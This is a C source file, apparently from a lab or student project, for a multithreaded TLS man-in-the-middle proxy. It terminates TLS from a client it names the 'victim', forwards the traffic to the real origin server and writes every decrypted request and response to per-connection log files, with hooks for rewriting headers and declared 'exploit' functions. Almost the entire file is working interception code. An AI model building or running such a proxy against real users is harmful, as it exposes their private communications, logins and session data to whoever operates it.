#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>

#include "shared.h"
#include "sslutil.h"
#include "httputil.h"

int create_socket(uint16_t port)
{
    int skt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (skt < 0)
    {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(skt, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        FAILFAST(create_socket, "Unable to bind");
    }

    if (listen(skt, SOMAXCONN) < 0)
    {
        FAILFAST(create_socket, "Unable to listen");
    }

    return skt;
}

void *proxyHandler(void *arg);
void *handleRequest(void *sslreq);
void transferData(SSL *victim, SSL *host, FILE *logReq, FILE *logRes);
void modifyRequestHeader(BIO *target, const char *tagStart, const char *valueStart, int len);
void modifyResponseHeader(BIO *target, const char *tagStart, const char *valueStart, int len);
void exploitVictimData(char *buffer, int len);
void exploitHostData(char *buffer, int len);
int connectionId;
pthread_mutex_t connectionMutex = PTHREAD_MUTEX_INITIALIZER;
char logFolder[120];

int main(int argc, char **argv)
{
    int port = 27013;
    struct tm *t;
    time_t tt;
    time(&tt);
    t = localtime(&tt);
    char folder[80] = {0};
    strftime(folder, 80, "%Y-%m-%d-%H-%M-%S", t);
    strcat(logFolder, "logs");
    int s = mkdir(logFolder, S_IRWXU);
    strcat(logFolder, "/");
    strcat(logFolder, folder);
    s = mkdir(logFolder, S_IRWXU);

    if (argc == 3)
    {
        if (strcmp(argv[1], "-p") == 0)
        {
            sscanf(argv[2], "%d", &port);
        }
    }
    SSL_library_init();
    SSL_load_error_strings();
    SSL_CTX *ctx = ssl_create_context();
    ssl_configure_context(ctx);
    create_global_contexts();

    int sock = create_socket(port);
    // signal(SIGPIPE, SIG_IGN);

    printf("Listening on port %d\n", port);
    while (1) // handle connection
    {
        struct sockaddr_in addr;
        int len = sizeof(addr);
        SSL *ssl;
        int client = accept(sock, (struct sockaddr *)&addr, &len);
        if (client < 0)
        {
            FAILFAST(main, "Unable to accept");
        }
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client);
        pthread_t thread;
        pthread_create(&thread, NULL, proxyHandler, ssl);
        pthread_detach(thread);
        // proxyHandler(ssl);
        //  handleRequest(ssl);
    }

    free_global_contexts();
    SSL_CTX_free(ctx);
}

void errCloseSSL(SSL *ssl, int err)
{
    int fd = SSL_get_fd(ssl);
    if (err != SSL_ERROR_SYSCALL && err != SSL_ERROR_SSL)
        SSL_shutdown(ssl);
    SSL_free(ssl);
    if (fd >= 0)
        close(fd);
}

void errCloseFiles(FILE *req, FILE *res)
{
    fprintf(req, "\nFILE CLOSED ABNORMALY\n");
    fprintf(res, "\nFILE CLOSED ABNORMALY\n");
    fclose(req);
    fclose(res);
}

void freeBios(BIO *header, BIO *contentCache, BIO *targetHeader)
{
    if (header)
        BIO_free(header);
    if (contentCache)
        BIO_free(contentCache);
    if (targetHeader)
        BIO_free(targetHeader);
}

int logBio(BIO *bio, FILE *file)
{
    BUF_MEM *mem;
    BIO_get_mem_ptr(bio, &mem);
    fwrite(mem->data, 1, mem->length, file);
}
int logData(char *buf, int len, FILE *file)
{
    fwrite(buf, 1, len, file);
}

static int writeBioToSsl(BIO *bio, SSL *ssl, size_t *written)
{
    BUF_MEM *buf;
    size_t temp;
    BIO_get_mem_ptr(bio, &buf);
    if (written == NULL)
    {
        written = &temp;
    }
    return SSL_write_ex(ssl, buf->data, buf->length, written);
}

void *proxyHandler(void *arg)
{
    int connid;
    pthread_mutex_lock(&connectionMutex);
    connid = ++connectionId;
    pthread_mutex_unlock(&connectionMutex);

    SSL *ssl = arg;
    ProxySession *session = ProxySession_New(ssl, logFolder, connid, modifyRequestHeader, modifyResponseHeader);
    if (!ProxySession_ConnectToVictim(session))
    {
        LOGERROR(proxyHandler, "Failed to connect to victim");
        ProxySession_Free(session);
        return NULL;
    }
    char *origin = ProxySession_RetrieveOrigin(session);
    if (!origin)
    {
        LOGERROR(proxyHandler, "Failed to retrieve origin");
        ProxySession_Free(session);
        return NULL;
    }
    if (!ProxySession_ConnectToOrigin(session))
    {
        LOGERROR(proxyHandler, "Failed to connect to origin");
        ProxySession_Free(session);
        return NULL;
    }
    while (!session->shouldShutdown)
    {
        int ret = ProxySession_WaitToRead(session);
        ProxyResult proxy;
        if ((proxy = ProxySession_HandleVictimTransmit(session)) <= 0)
        {
            if (proxy == PROXY_FATAL)
            {
                LOGERROR(proxyHandler, "Failed to transmit to victim");
                ProxySession_Free(session);
                return NULL;
            }
        }
        if (!ProxySession_HandleHostTransmit(session))
        {
            LOGERROR(proxyHandler, "Failed to transmit to host");
            ProxySession_Free(session);
            return NULL;
        }
    }

    ProxySession_Free(session);
    return NULL;
}

void *handleRequest(void *sslreq)
{
    int connid;
    pthread_mutex_lock(&connectionMutex);
    connid = ++connectionId;
    pthread_mutex_unlock(&connectionMutex);

    char fName[256];
    strcpy(fName, logFolder);
    sprintf(fName + strlen(fName), "/connection-%d", connid);
    char fNameReq[256];
    strcpy(fNameReq, fName);
    strcat(fNameReq, ".request");
    FILE *logReq = fopen(fNameReq, "w");
    char fNameRes[256];
    strcpy(fNameRes, fName);
    strcat(fNameRes, ".response");
    FILE *logRes = fopen(fNameRes, "w");

    SSL *ssl = sslreq;
    int client = SSL_get_fd(ssl);
    int err = 0;
    int ret = 0;
    char buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);

    if (ret = SSL_accept(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        err = SSL_get_error(ssl, ret);
    }
    if (err != 0) // fatal errors
    {
        errCloseSSL(ssl, err);
        errCloseFiles(logReq, logRes);
        return NULL;
    }

    size_t readBytes = 0;
    BIO *headerBio = BIO_new(BIO_s_mem());
    BIO *contentCache = BIO_new(BIO_s_mem());
    char *endStr = "\r\n\r\n";
    int comparePos = 0;
    bool hasReadHeader = false;
    int zeroSizeCnt = 0;
    while (!hasReadHeader && (ret = SSL_read_ex(ssl, buffer, BUF_SIZE, &readBytes) >= 0))
    {
        if (ret == 0)
        {
            ret = SSL_do_handshake(ssl);
            err = SSL_get_error(ssl, ret);
            continue;
        }
        if (readBytes > 0) // we should have read header
        {
            for (int i = 0; i < readBytes; i++)
            {
                if (buffer[i] != endStr[comparePos])
                {
                    if (comparePos != 0)
                        comparePos = 0; // reset
                    continue;
                }
                for (; buffer[i] == endStr[comparePos] && i < readBytes && comparePos < 4;
                     i++, comparePos++)
                    ;
                if (comparePos == 4) // we have found the end
                {
                    hasReadHeader = true;
                    BIO_write(headerBio, buffer, i); // i is past-end here, in other words, len
                    BIO_write(contentCache, buffer + i, readBytes - i);
                    break;
                }
                else
                {
                    // revert i
                    --i;
                }
            }
            if (!hasReadHeader)
            {
                BIO_write(headerBio, buffer, readBytes);
            }
        }
        else
        {
            err = SSL_get_error(ssl, ret);
            if (err != SSL_ERROR_NONE && err != SSL_ERROR_ZERO_RETURN)
            {
                errCloseSSL(ssl, err);
                errCloseFiles(logReq, logRes);
                return NULL;
            }
        }
    }

    BIO *targetHeader = BIO_new(BIO_s_mem());
    char line[BUF_SIZE];
    int lineLen;

    struct hostent *remoteHost;
    bool foundHost = false;
    while (lineLen = BIO_gets(headerBio, line, BUF_SIZE))
    {
        if (memcmp(line, "\r\n", 2) == 0)
        {
            BIO_write(targetHeader, "\r\n", 2);
        }
        int start = 0;
        for (; line[start] != ' '; start++) // skip tag
            ;
        for (; line[start] == ' '; start++) // skip spaces
            ;
        if (memcmp(line, "Host", 4) == 0)
        {
            foundHost = true;
            int end = lineLen - 2;
            char *host = malloc(end + 1 - start);
            memset(host, 0, end + 1 - start);
            memcpy(host, line + start, end - start);
            remoteHost = gethostbyname(host);
            free(host);
            if (remoteHost == NULL) // or satisify some condition
            {
#if DEBUG
                remoteHost = gethostbyname("www.baidu.com");
                BIO_puts(targetHeader, "Host: www.baidu.com\r\n");
#endif
            }
            else
            {
                BIO_write(targetHeader, line, lineLen);
            }
        }
        else
        {
            modifyRequestHeader(targetHeader, line, line + start, lineLen);
        }
    }
    BIO_free(headerBio);
    if (!foundHost)
    {
        freeBios(NULL, contentCache, targetHeader);
    }

    int serverSocket = 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr;
    if (remoteHost == NULL || remoteHost->h_addrtype != AF_INET || remoteHost->h_addr_list[0] == 0)
    {
        LOGERROR(gethostbyname, "Unable to resolve remote host");
        errCloseSSL(ssl, SSL_ERROR_NONE);
        errCloseFiles(logReq, logRes);
        return NULL;
    }
    addr.sin_addr.s_addr = *(u_int32_t *)remoteHost->h_addr_list[0];
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket < 0)
    {
        perror("Unable to create socket");
        errCloseSSL(ssl, SSL_ERROR_NONE);
        freeBios(NULL, contentCache, targetHeader);
        errCloseFiles(logReq, logRes);
        return NULL;
    }
    if (connect(serverSocket, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        LOGERROR(handleRequest, "Unable to bind");
        close(serverSocket);
        SSL_write(ssl, "Failed to connect to host!", 26);
        errCloseSSL(ssl, SSL_ERROR_NONE);
        freeBios(NULL, contentCache, targetHeader);
        errCloseFiles(logReq, logRes);
        return NULL;
    }
    SSL_CTX *subContext = SSL_CTX_new(TLS_client_method());
    SSL *subSsl = SSL_new(subContext);
    SSL_set_fd(subSsl, serverSocket);
    if (ret = SSL_connect(subSsl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        err = SSL_get_error(subSsl, ret);
        errCloseSSL(subSsl, err);
        errCloseSSL(ssl, SSL_ERROR_NONE);
        freeBios(NULL, contentCache, targetHeader);
        errCloseFiles(logReq, logRes);
        return NULL;
    }

    ret = writeBioToSsl(targetHeader, subSsl, NULL);
    logBio(targetHeader, logReq);
    if (ret >= 0) // good connection
    {
        BIO_free(targetHeader);
        ret = writeBioToSsl(contentCache, subSsl, NULL);
        logBio(contentCache, logReq);
        BIO_free(contentCache);
        transferData(ssl, subSsl, logReq, logRes);
    }

    printf("Connection #%d ended!\n", connid);

    SSL_shutdown(subSsl);
    SSL_free(subSsl);
    close(serverSocket);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client);

    fclose(logReq);
    fclose(logRes);
}

void modifyRequestHeader(BIO *target, const char *tagStart, const char *valueStart, int len)
{
    int written = BIO_write(target, tagStart, len);
}
void modifyResponseHeader(BIO *target, const char *tagStart, const char *valueStart, int len)
{
    int written = BIO_write(target, tagStart, len);
}

void transferData(SSL *victim, SSL *host, FILE *logReq, FILE *logRes)
{
    char buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);
    int ret = 0;
    struct timeval timeout = {0, 1000};
    int victimSocket = SSL_get_fd(victim);
    int hostSocket = SSL_get_fd(host);
    char *endStr = "\r\n\r\n";
    int comparePos = 0;
    bool hasReadHeader = false;
    BIO *headerBio = BIO_new(BIO_s_mem());
    BIO *contentCache = BIO_new(BIO_s_mem());

    while (1)
    {
        /* code */
        fd_set fd_read;
        FD_ZERO(&fd_read);
        FD_SET(victimSocket, &fd_read);
        FD_SET(hostSocket, &fd_read);
        int max = victimSocket > hostSocket ? victimSocket + 1 : hostSocket + 1;

        ret = select(max, &fd_read, NULL, NULL, &timeout);
        if (ret < 0)
        {
            LOGERROR(transferData, "Failed to select!");
            break;
        }
        else if (ret == 0)
        {
            continue;
        }

        size_t readBytes;
        size_t writtenBytes;
        if (FD_ISSET(victimSocket, &fd_read))
        {
            ret = SSL_read_ex(victim, buffer, BUF_SIZE, &readBytes);
            // normally this should be
            if (ret > 0) // success
            {
                ret = SSL_write_ex(host, buffer, readBytes, &writtenBytes);
                logData(buffer, readBytes, logReq);
                if (!ret || readBytes != writtenBytes) // error sending to host
                {
                    LOGERROR(transferData, "Failed to transmit to Host!");
                    break;
                }
            }
            else
            {
                int err = SSL_get_error(victim, ret);
                if (err != SSL_ERROR_ZERO_RETURN)
                {
                    LOGERROR(transferData, "Failed to read from victim!");
                }
                else
                {
                    // another dirty approach to detect closed
                    struct tcp_info info;
                    int len = sizeof info;
                    if (getsockopt(victimSocket, IPPROTO_TCP, TCP_INFO, &info, (socklen_t *)&len) == 0)
                    {
                        if (info.tcpi_state == TCP_CLOSE_WAIT)
                        {
                            break;
                        }
                    }
                }
            }
        }
        if (FD_ISSET(hostSocket, &fd_read))
        {
            ret = SSL_read_ex(host, buffer, BUF_SIZE, &readBytes);
            if (ret > 0) // success
            {
                if (!hasReadHeader)
                {
                    for (int i = 0; i < readBytes; i++)
                    {
                        if (buffer[i] != endStr[comparePos])
                        {
                            if (comparePos != 0)
                                comparePos = 0; // reset
                            continue;
                        }
                        for (; buffer[i] == endStr[comparePos] && i < readBytes && comparePos < 4;
                             i++, comparePos++)
                            ;
                        if (comparePos == 4) // we have found the end
                        {
                            hasReadHeader = true;
                            BIO_write(headerBio, buffer, i); // i is past-end here, in other words, len
                            BIO_write(contentCache, buffer + i, readBytes - i);
                            break;
                        }
                        else
                        {
                            // revert i
                            --i;
                        }
                    }
                    if (hasReadHeader)
                    {
                        BIO *targetHeader = BIO_new(BIO_s_mem());
                        int lineLen;
                        char line[BUF_SIZE];
                        while (lineLen = BIO_gets(headerBio, line, BUF_SIZE))
                        {
                            if (memcmp(line, "\r\n\r\n", 4) == 0)
                            {
                                BIO_write(targetHeader, "\r\n\r\n", 4);
                            }
                            int start = 0;
                            for (; line[start] != ' '; start++) // skip tag
                                ;
                            for (; line[start] == ' '; start++) // skip spaces
                                ;
                            modifyResponseHeader(targetHeader, line, line + start, lineLen);
                        }
                        writeBioToSsl(targetHeader, victim, &writtenBytes);
                        writeBioToSsl(contentCache, victim, &writtenBytes);
                        logBio(targetHeader, logRes);
                        logBio(contentCache, logRes);
                        freeBios(headerBio, contentCache, targetHeader);
                    }
                    else
                    {
                        BIO_write(headerBio, buffer, readBytes);
                    }
                }
                else
                {
                    ret = SSL_write_ex(victim, buffer, readBytes, &writtenBytes);
                    logData(buffer, readBytes, logRes);
                    if (!ret || readBytes != writtenBytes) // error sending to victim
                    {
                        LOGERROR(transferData, "Failed to transmit to victim!");
                        break;
                    }
                }
            }
            else
            {
                int err = SSL_get_error(victim, ret);
                if (err != SSL_ERROR_ZERO_RETURN)
                {
                    LOGERROR(transferData, "Failed to read from Host!");
                }
                break;
            }
        }
    }
}